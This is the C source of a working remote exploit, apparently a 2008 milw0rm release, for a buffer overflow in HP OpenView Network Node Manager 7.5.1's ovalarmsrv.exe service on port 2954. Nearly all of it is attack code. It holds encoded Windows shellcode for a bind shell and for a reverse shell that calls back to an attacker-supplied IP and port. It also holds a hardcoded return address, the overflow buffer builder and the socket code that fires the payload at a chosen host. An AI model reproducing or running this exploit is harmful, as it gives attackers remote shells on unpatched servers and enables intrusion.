/* Dreatica-FXP crew
* 
* ----------------------------------------
* Target         : HP OpenView Network Node Manager v7.5
* ----------------------------------------
* Exploit        : HP OpenView NNM v7.5.1 ovalarmsrv.exe Remote Buffer Overflow Exploit
* Exploit date   : 07.04.2008
* Exploit writer : Heretic2 (heretic2x@gmail.com)
* OS             : Windows ALL 
* Crew           : Dreatica-FXP
* Location       : http://www.milw0rm.com/
* ----------------------------------------
* Info           : Vulnerabilty was found by Luigi Auriemma. Sending more than 524 bytes 
*                  to the 2954 port can overflow the EIP register. Too lazy to research the whole 
*                  array of badchars, so simply used the alpahnumeric shellcodes. 
*                  0x00 0x0a 0x20 are bad chars, but i think there are few more.
*                  I only got the ret address for the 7.5.1 version, but 7.5.3 is also vulnerable. 
*                  Using the 2954 port i was not able to determine exact version of HP OV
*                  which runs on the server.
* ----------------------------------------
* Thanks to:
*		1. Luigi Auriemma          ( http://aluigi.org   <aluigi [at] autistici.org> )
*		2. The Metasploit project  ( http://metasploit.com                           ) 
*       3. ALPHA 2: Zero-tolerance ( <skylined [at] edup.tudelft.nl>                 ) 
*		4. Dreatica-FXP crew       (                                                 )
************************************************************************************
* This was written for educational purpose only. Use it at your own risk. Author will be not be 
* responsible for any damage, caused by that code.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <time.h>

#pragma comment(lib,"ws2_32")


void usage(char * s);
void logo();
void end_logo();
void print_info_banner_line(const char * key, const char * val);

void extract_ip_and_port( char * &remotehost, int * port, char * str);
int fill_payload_args(int sh, int bport, char * reverseip, int reverseport, struct h2readyp * xx);

int hr2_connect(char * remotehost, int port, int timeout);
int hr2_udpconnect(char * remotehost, int port,  struct sockaddr_in * addr, int timeout);
int hr2_updsend(char * remotehost, unsigned char * buf, unsigned int len, int port, struct sockaddr_in * addr, int timeout);
int execute(struct _buf * abuf, char * remotehost, int port);

struct _buf 
{
	unsigned char * ptr;
	unsigned int size;
};
int construct_shellcode(int sh, struct _buf * shf, int target, char * reverseip, int reverseport);
int construct_buffer(struct _buf * shf, int target, struct _buf * abuf);




// -----------------------------------------------------------------
// XGetopt.cpp  Version 1.2
// -----------------------------------------------------------------
int getopt(int argc, char *argv[], char *optstring);
char	*optarg;		// global argument pointer
int		optind = 0, opterr; 	// global argv index
// -----------------------------------------------------------------
// -----------------------------------------------------------------


struct {
	const char * name;
	int length;
	char *shellcode;	
}shellcodes[]={ 	
	{  "BindShell on 9998 [                    ]", 
		// alphanumeric encoder took from "ALPHA 2: Zero-tolerance." code
		/*
		* windows/shell_bind_tcp - 
		* http://www.metasploit.com
		* Encoder: generic/none
		*/	
		696,
		"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"
		"\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41"
		"\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
		"\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x69\x6c\x43"
		"\x5a\x6a\x4b\x70\x4d\x6b\x58\x59\x69\x4b\x4f\x4b\x4f\x4b\x4f\x53"
		"\x50\x4c\x4b\x32\x4c\x47\x54\x77\x54\x4c\x4b\x63\x75\x75\x6c\x6e"
		"\x6b\x31\x6c\x57\x75\x53\x48\x76\x61\x7a\x4f\x6e\x6b\x32\x6f\x56"
		"\x78\x6c\x4b\x61\x4f\x51\x30\x56\x61\x78\x6b\x32\x69\x6c\x4b\x44"
		"\x74\x4c\x4b\x46\x61\x38\x6e\x74\x71\x6b\x70\x6f\x69\x4e\x4c\x6f"
		"\x74\x4b\x70\x51\x64\x77\x77\x39\x51\x78\x4a\x64\x4d\x45\x51\x59"
		"\x52\x58\x6b\x4c\x34\x65\x6b\x70\x54\x77\x54\x64\x68\x71\x65\x7a"
		"\x45\x4e\x6b\x73\x6f\x45\x74\x53\x31\x5a\x4b\x33\x56\x4c\x4b\x56"
		"\x6c\x52\x6b\x6e\x6b\x33\x6f\x35\x4c\x67\x71\x7a\x4b\x74\x43\x36"
		"\x4c\x6e\x6b\x6b\x39\x30\x6c\x64\x64\x55\x4c\x33\x51\x79\x53\x66"
		"\x51\x6b\x6b\x51\x74\x6c\x4b\x70\x43\x56\x50\x4c\x4b\x51\x50\x54"
		"\x4c\x6c\x4b\x34\x30\x35\x4c\x6c\x6d\x4c\x4b\x53\x70\x63\x38\x71"
		"\x4e\x72\x48\x4c\x4e\x70\x4e\x64\x4e\x58\x6c\x72\x70\x59\x6f\x69"
		"\x46\x51\x76\x70\x53\x31\x76\x50\x68\x35\x63\x56\x52\x31\x78\x52"
		"\x57\x73\x43\x74\x72\x71\x4f\x56\x34\x69\x6f\x4e\x30\x35\x38\x7a"
		"\x6b\x7a\x4d\x6b\x4c\x35\x6b\x70\x50\x49\x6f\x68\x56\x71\x4f\x6e"
		"\x69\x4d\x35\x30\x66\x4f\x71\x5a\x4d\x45\x58\x75\x52\x33\x65\x32"
		"\x4a\x77\x72\x79\x6f\x7a\x70\x71\x78\x79\x49\x77\x79\x6c\x35\x4e"
		"\x4d\x33\x67\x49\x6f\x6b\x66\x50\x53\x62\x73\x53\x63\x46\x33\x50"
		"\x53\x31\x53\x51\x43\x43\x73\x70\x53\x4b\x4f\x6a\x70\x33\x56\x70"
		"\x68\x74\x67\x64\x4e\x63\x56\x31\x43\x4d\x59\x4b\x51\x4d\x45\x33"
		"\x58\x4c\x64\x36\x7a\x70\x70\x4b\x77\x56\x37\x6b\x4f\x4e\x36\x73"
		"\x5a\x56\x70\x70\x51\x70\x55\x4b\x4f\x4a\x70\x73\x58\x4d\x74\x4c"
		"\x6d\x76\x4e\x38\x69\x66\x37\x6b\x4f\x6b\x66\x52\x73\x50\x55\x4b"
		"\x4f\x58\x50\x65\x38\x4b\x55\x43\x79\x4f\x76\x62\x69\x51\x47\x59"
		"\x6f\x38\x56\x42\x70\x50\x54\x32\x74\x51\x45\x79\x6f\x78\x50\x6e"
		"\x73\x31\x78\x79\x77\x52\x59\x4f\x36\x73\x49\x62\x77\x4b\x4f\x78"
		"\x56\x61\x45\x4b\x4f\x5a\x70\x52\x46\x50\x6a\x71\x74\x50\x66\x52"
		"\x48\x61\x73\x52\x4d\x4b\x39\x6b\x55\x51\x7a\x72\x70\x76\x39\x77"
		"\x59\x5a\x6c\x6c\x49\x59\x77\x42\x4a\x70\x44\x4c\x49\x58\x62\x50"
		"\x31\x49\x50\x6b\x43\x4c\x6a\x6b\x4e\x43\x72\x34\x6d\x4b\x4e\x51"
		"\x52\x44\x6c\x5a\x33\x4e\x6d\x52\x5a\x35\x68\x4e\x4b\x4c\x6b\x4e"
		"\x4b\x30\x68\x52\x52\x59\x6e\x6f\x43\x32\x36\x4b\x4f\x42\x55\x70"
		"\x44\x6b\x4f\x6b\x66\x43\x6b\x71\x47\x72\x72\x43\x61\x70\x51\x52"
		"\x71\x70\x6a\x77\x71\x72\x71\x36\x31\x42\x75\x72\x71\x4b\x4f\x4a"
		"\x70\x75\x38\x6c\x6d\x58\x59\x47\x75\x7a\x6e\x52\x73\x59\x6f\x7a"
		"\x76\x30\x6a\x69\x6f\x49\x6f\x70\x37\x4b\x4f\x78\x50\x4e\x6b\x53"
		"\x67\x59\x6c\x4f\x73\x38\x44\x70\x64\x59\x6f\x4b\x66\x52\x72\x49"
		"\x6f\x48\x50\x43\x58\x7a\x50\x6f\x7a\x45\x54\x53\x6f\x70\x53\x4b"
		"\x4f\x6a\x76\x69\x6f\x5a\x70\x41"

	},
	{  "ReverseShell      [ args: -R <ip:port> ]", 
		287,
		/*
		* windows/shell_reverse_tcp - 287 bytes
		* http://www.metasploit.com
		* Encoder: generic/none	
		*/	
		"\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b"
		"\x45\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01"
		"\xeb\x49\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07"
		"\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f"
		"\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b"
		"\x89\x6c\x24\x1c\x61\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c"
		"\x8b\x70\x1c\xad\x8b\x40\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff"
		"\xd6\x66\x53\x66\x68\x33\x32\x68\x77\x73\x32\x5f\x54\xff\xd0"
		"\x68\xcb\xed\xfc\x3b\x50\xff\xd6\x5f\x89\xe5\x66\x81\xed\x08"
		"\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09\xf5\xad\x57\xff\xd6\x53"
		"\x53\x53\x53\x43\x53\x43\x53\xff\xd0\x68\x7f\x00\x00\x01\x66"
		"\x68\x11\x5c\x66\x53\x89\xe1\x95\x68\xec\xf9\xaa\x60\x57\xff"
		"\xd6\x6a\x10\x51\x55\xff\xd0\x66\x6a\x64\x66\x68\x63\x6d\x6a"
		"\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89\xe2\x31\xc0\xf3\xaa\x95"
		"\x89\xfd\xfe\x42\x2d\xfe\x42\x2c\x8d\x7a\x38\xab\xab\xab\x68"
		"\x72\xfe\xb3\x16\xff\x75\x28\xff\xd6\x5b\x57\x52\x51\x51\x51"
		"\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53\xff"
		"\xd6\x6a\xff\xff\x37\xff\xd0\x68\xe7\x79\xc6\x79\xff\x75\x04"
		"\xff\xd6\xff\x77\xfc\xff\xd0\x68\xf0\x8a\x04\x5f\x53\xff\xd6"
		"\xff\xd0"
	},
	{NULL, 0, NULL}
};


 
struct _target{
	const char *t ;
	unsigned long ret, fix ;
} targets[]=
{	
	{"HP OpenView Network Node Manager  v7.5.1", 0x5a01d78d, 0x5a04d3d0 },
	{"DOS/Crash/Debug/Test/Fun",                 0x41414141, 0x41414141 },
	{NULL,                                       0x00000000, 0x00000000 }
};




// memory for buffers
unsigned char payloadbuffer[10000], a_buffer[10000];
long dwTimeout=5000;
int timeout=5000;


// alphanumeric decoder took from "ALPHA 2: Zero-tolerance." code
char alphanum_decoder[] = 
		"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"
		"\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41"
		"\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
		"\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49";
// alphanumeric encoder took from "ALPHA 2: Zero-tolerance." code
int alphanumeric_exec(char *to_encode, int len, char *encoded, int * rlen )
{
	int   i,ii=0, input, A, B, C, D, E, F, length=(int)strlen(to_encode);
	char* valid_chars = "0123456789BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"; // mixed chars
	char temp[10];
	memset(temp, 0 , sizeof(temp));	
	srand((int)clock());  
	for(ii=0;ii<len;ii++)
	{
		input = to_encode[ii];
		A = (input & 0xf0) >> 4;
		B = (input & 0x0f);
		F = B;
		i = rand() % ((int)strlen(valid_chars));
		while ((valid_chars[i] & 0x0f) != F) { i = ++i % ((int)strlen(valid_chars)); }
		E = valid_chars[i] >> 4;
		D = (A^E);
		i = rand() % ((int)strlen(valid_chars));
		while ((valid_chars[i] & 0x0f) != D) { i = ++i % ((int)strlen(valid_chars)); }
		C = valid_chars[i] >> 4;
		sprintf(temp,"%c%c", (C<<4)+D, (E<<4)+F);
		encoded[strlen(encoded)]=temp[0];
		encoded[strlen(encoded)]=temp[1];
	}
	encoded[strlen(encoded)]='A';
	*rlen=(int)strlen(encoded);
	return 1;

}


int main(int argc, char **argv)
{
	char c,*remotehost=NULL,*file=NULL,*reverseip=NULL,*url=NULL,temp1[100];
	int HAVE_R=0,HAVE_U=0,sh,port=2954,itarget=0,reverseport=9999;
	struct _buf  fshellcode, sbuffer;

	logo();
	if(argc<2)
	{
		usage(argv[0]);		
		return -1;
	}

	WSADATA wsa;
	WSAStartup(MAKEWORD(2,0), &wsa);
	// set defaults
	sh=0;	
	// ------------	
	
	while((c = getopt(argc, argv, "h:t:R:T:"))!= EOF)
	{
		switch (c)
		{
			case 'h':
				if (strchr(optarg,':')==NULL)
				{
					remotehost=optarg;
				}else 
				{
					sscanf(strchr(optarg,':')+1, "%d", &port);
					remotehost=optarg;
					*(strchr(remotehost,':'))='\0';
				}
				break; 				
			case 't':
				sscanf(optarg, "%d", &itarget);
				itarget--;
				break;
			case 'R':
				HAVE_R=1;
				if (strchr(optarg,':')==NULL)
				{
					reverseip=optarg;
				}else 
				{
					sscanf(strchr(optarg,':')+1, "%d", &reverseport);
					reverseip=optarg;
					*(strchr(reverseip,':'))='\0';
				}
				break;			
			case 'T':				
				sscanf(optarg, "%ld", &dwTimeout);
				break; 			
			default:
	            usage(argv[0]);
				WSACleanup();
			return -1;
		}		
	}	
	sh=HAVE_R;

	if(remotehost == NULL)
	{
		printf("   [-] Please enter remotehost\n");
		end_logo();
		WSACleanup();
		return -1;
	}
	print_info_banner_line("Host", remotehost);
	sprintf(temp1, "%d", port);
	print_info_banner_line("Port", temp1);
	print_info_banner_line("Payload", shellcodes[sh].name);

	if(sh==0)
	{		
		sprintf(temp1, "%d", 9998);
		print_info_banner_line("BINDPort", temp1);
	}
	if(sh==1)
	{
		print_info_banner_line("CB IP", reverseip);
		sprintf(temp1, "%d", reverseport);
		print_info_banner_line("CB port", temp1);
	}
	printf(" # ------------------------------------------------------------------- # \n");
	fflush(stdout);


	memset(payloadbuffer, 0, sizeof(payloadbuffer));
	fshellcode.ptr=payloadbuffer;
	fshellcode.size=0;	

	memset(a_buffer, 0, sizeof(a_buffer));
	sbuffer.ptr=a_buffer;
	sbuffer.size=0;

	if(!construct_shellcode(sh, &fshellcode, itarget, reverseip, reverseport))
	{
		end_logo();
		WSACleanup();
		return -1;
	}

	printf("   [+] Payload constructed\n");
	
	if(!construct_buffer(&fshellcode, itarget, &sbuffer))
	{
		printf("   [-] Buffer not constructed\n");
		end_logo();
		WSACleanup();
		return -1;
	}
	printf("   [+] Final buffer constructed\n");
	

	if(!execute(&sbuffer, remotehost, port))
	{
		printf("   [-] Buffer not sent\n");
		end_logo();
		WSACleanup();
		return -1;
	}
	printf("   [+] Buffer sent\n");
	
	end_logo();
	WSACleanup();
	return 0;
}

int construct_shellcode(int sh, struct _buf * shf, int target, char * rerverseip, int reverseport)
{
	int x;
	char fsh[1000];

	memcpy(shf->ptr, shellcodes[sh].shellcode, shellcodes[sh].length);
	shf->size=shellcodes[sh].length;
	if(sh==1)
	{		
		memset(shf->ptr,0,shf->size+1);
		memset(fsh,0,sizeof(fsh));
		memcpy(fsh, shellcodes[sh].shellcode, shellcodes[sh].length);
		

		static struct hostent *host = gethostbyname(rerverseip);
		static struct sockaddr_in addr;
		if(host == NULL)
		{
			printf("   [-] Reverse ip/hostanme is invalid\n");
			return 0;
		}

		addr.sin_addr = *(struct in_addr*)host->h_addr;
		fsh[160] = (addr.sin_addr.S_un.S_un_b.s_b1) ;
		fsh[161] = (addr.sin_addr.S_un.S_un_b.s_b2) ;
		fsh[162] = (addr.sin_addr.S_un.S_un_b.s_b3) ;
		fsh[163] = (addr.sin_addr.S_un.S_un_b.s_b4) ;
        
		fsh[166] = ((reverseport >> 8) & 0xff) ;
		fsh[167] = ((reverseport     ) & 0xff) ;	
		
		memcpy(shf->ptr,alphanum_decoder,sizeof(alphanum_decoder)-1);
		alphanumeric_exec(fsh, shellcodes[sh].length, (char*)(shf->ptr+sizeof(alphanum_decoder)-1), &x);
		shf->size = sizeof(alphanum_decoder)-1+x;
	}
	return 1;
}


int construct_buffer(struct _buf * shf, int target, struct _buf * sbuf)
{
	unsigned char * cp = sbuf->ptr;

		// ctl command
	*cp++='6';
	*cp++='2';
	*cp++=' ';

		// overflow
	memset(cp, 'b', 516);
	cp+=516;	

		// EIP
	*cp++ = (char)((targets[target].ret      ) & 0xff);
	*cp++ = (char)((targets[target].ret >>  8) & 0xff);
	*cp++ = (char)((targets[target].ret >> 16) & 0xff);
	*cp++ = (char)((targets[target].ret >> 24) & 0xff);

		// Fix
	*cp++ = (char)((targets[target].fix      ) & 0xff);
	*cp++ = (char)((targets[target].fix >>  8) & 0xff);
	*cp++ = (char)((targets[target].fix >> 16) & 0xff);
	*cp++ = (char)((targets[target].fix >> 24) & 0xff);

		// JFF
	*cp++ = '\x90';
	*cp++ = '\x90';
	*cp++ = '\x90';
	*cp++ = '\x90';

		// shellcode
	memset(cp, '\x41', 1000);		
	memcpy(cp, shf->ptr, shf->size);
	cp+=1000;		
	
	sbuf->size=(int)(cp-sbuf->ptr);
	return 1;
}


void extract_ip_and_port( char * &remotehost, int * port, char * str)
{
	if (strchr(str,':')==NULL)
	{
		remotehost=str;
	}else 
	{
		sscanf(strchr(str,':')+1, "%d", port);
		remotehost=str;
		*(strchr(remotehost,':'))='\0';
	}
}



int hr2_connect(char * remotehost, int port, int timeout)
{
	SOCKET s;
	struct hostent *host;
	struct sockaddr_in addr;
	TIMEVAL stTime;
	TIMEVAL *pstTime = NULL;
	fd_set x;
	int res;

	if (INFINITE != timeout) 
	{
	    stTime.tv_sec = timeout / 1000;
	    stTime.tv_usec = timeout % 1000;
	    pstTime = &stTime;
	}

	host = gethostbyname(remotehost);
	if (!host) return SOCKET_ERROR;

	addr.sin_addr = *(struct in_addr*)host->h_addr;
	addr.sin_port = htons(port);
	addr.sin_family = AF_INET;

	s = socket(AF_INET, SOCK_STREAM, 0);
	if (s == SOCKET_ERROR)
	{
		closesocket(s);
		return SOCKET_ERROR;
	}

	unsigned long l = 1;
	ioctlsocket( s, FIONBIO, &l ) ;

	connect(s, (struct sockaddr*)&addr, sizeof(addr));

	FD_ZERO(&x);
	FD_SET(s, &x);

	res = select(NULL,NULL,&x,NULL,pstTime);
	if(res< 0) return SOCKET_ERROR;
	if(res==0) return 0;
	return (int)s;
}


int hr2_tcpsend(SOCKET s, unsigned char * buf, unsigned int len, int timeout)
{
	return send(s, (char *)buf, len, 0);
}

int hr2_tcprecv(SOCKET s, unsigned char * buf, unsigned int len, int timeout)
{
	TIMEVAL stTime;
	TIMEVAL *pstTime = NULL;
	fd_set xy;
	int res;

	if (INFINITE != timeout) 
	{
	    stTime.tv_sec = timeout / 1000;
	    stTime.tv_usec = timeout % 1000;
	    pstTime = &stTime;
	}
	FD_ZERO(&xy);
	FD_SET(s, &xy);
	
	res = select(NULL,&xy,NULL,NULL,pstTime);

	if(res==0) return 0;
	if(res<0) return -1;

	return recv(s, (char *)buf, len, 0);
}

int execute(struct _buf * abuf, char * remotehost, int port)
{
	int x;
	SOCKET s ;

	s = hr2_connect(remotehost, port, 10000);
	if(s==0)
	{
		printf("   [-] connect() timeout\n");
		return 0;
	}
	if(s==SOCKET_ERROR)
	{
		printf("   [-] Connection failed\n");
		return 0;
	}		
	x = hr2_tcpsend(s, abuf->ptr, abuf->size, 0);
	printf("   [+] Sent %d out of %d bytes\n", x, abuf->size);

	closesocket(s);
	return 1;
}

// -----------------------------------------------------------------
// XGetopt.cpp  Version 1.2
// -----------------------------------------------------------------
int getopt(int argc, char *argv[], char *optstring)
{
	static char *next = NULL;
	if (optind == 0)
		next = NULL;

	optarg = NULL;

	if (next == NULL || *next == '\0')
	{
		if (optind == 0)
			optind++;

		if (optind >= argc || argv[optind][0] != '-' || argv[optind][1] == '\0')
		{
			optarg = NULL;
			if (optind < argc)
				optarg = argv[optind];
			return EOF;
		}

		if (strcmp(argv[optind], "--") == 0)
		{
			optind++;
			optarg = NULL;
			if (optind < argc)
				optarg = argv[optind];
			return EOF;
		}

		next = argv[optind];
		next++;		// skip past -
		optind++;
	}

	char c = *next++;
	char *cp = strchr(optstring, c);

	if (cp == NULL || c == ':')
		return '?';

	cp++;
	if (*cp == ':')
	{
		if (*next != '\0')
		{
			optarg = next;
			next = NULL;
		}
		else if (optind < argc)
		{
			optarg = argv[optind];
			optind++;
		}
		else
		{
			return '?';
		}
	}

	return c;
}
// -----------------------------------------------------------------
// -----------------------------------------------------------------
// -----------------------------------------------------------------


void print_info_banner_line(const char * key, const char * val)
{
	char temp1[100], temp2[100];

	memset(temp1,0,sizeof(temp1));	
	memset(temp1, '\x20' , 58 - strlen(val) -1);	

	memset(temp2,0,sizeof(temp2));
	memset(temp2, '\x20' , 8 - strlen(key));	
	printf(" #  %s%s: %s%s# \n", key, temp2, val, temp1);	

}



void usage(char * s)
{	
	int j;
	printf("\n");
	printf("    Usage: %s -h <host:port> -t <target> -R <ip:port>\n", s);
	printf("   -------------------------------------------------------------------\n");
	printf("    Arguments:\n");
	printf("      -h ........ host to attack, default port: 2954\n");
	printf("      -t ........ target to use\n");	
	printf("      -R ........ set reverse IP and port ( e.g. -R 192.168.0.11:9999 )\n");
	printf("      -T ........ socket timeout\n");
	printf("\n");
	printf("    Supported HP NNM versions:\n");
	for(j=0; targets[j].t!=0;j++)
	{
		printf("      %d. %s\n",j+1, targets[j].t);
	}					
	printf("\n");
	for(j=0; shellcodes[j].name!=0;j++)
	{
		printf("      %d. %s\n",j+1, shellcodes[j].name);
	}		
	end_logo();	
}

void logo()
{
	printf("\n\n");
	printf(" ####################################################################### \n");	
	printf(" #     ____                 __  _                  ______  __    _____ #\n");
	printf(" #    / __ \\________  _____/ /_(_)_________       / __/\\ \\/ /   / _  / #\n");
	printf(" #   / / / / ___/ _ \\/ __ / __/ / ___/ __ / ___  / /    \\  /   / // /  #\n");
	printf(" #  / /_/ / / /  ___/ /_// /_/ / /__/ /_// /__/ / _/    /  \\  / ___/   #\n");
	printf(" # /_____/_/  \\___/ \\_,_/\\__/_/\\___/\\__,_/     /_/     /_/\\_\\/_/       #\n");
	printf(" #                                 crew                                #\n");
	printf(" ####################################################################### \n");	
	printf(" #  Exploit : HP OpenView NNM v7.5.1 ovalarmsrv.exe Remote Exploit     # \n");
	printf(" #  Author  : Heretic2                                                 # \n");
	printf(" #  THANKS  : Luigi Auriemma, Metasploit, skylined                     # \n");
	printf(" #  Research: Luigi Auriemma                                           # \n");
	printf(" #  Version : 1.0                                                      # \n");
	printf(" #  System  : Windows ALL                                              # \n");
	printf(" #  Date    : 07.04.2008                                               # \n");
	printf(" # ------------------------------------------------------------------- # \n");
}

void end_logo()
{
	printf(" # ------------------------------------------------------------------- # \n");
	printf(" #                    Dreatica-FXP crew [Heretic2]                     # \n");	
	printf(" ####################################################################### \n\n");
}

// milw0rm.com [2008-04-14]
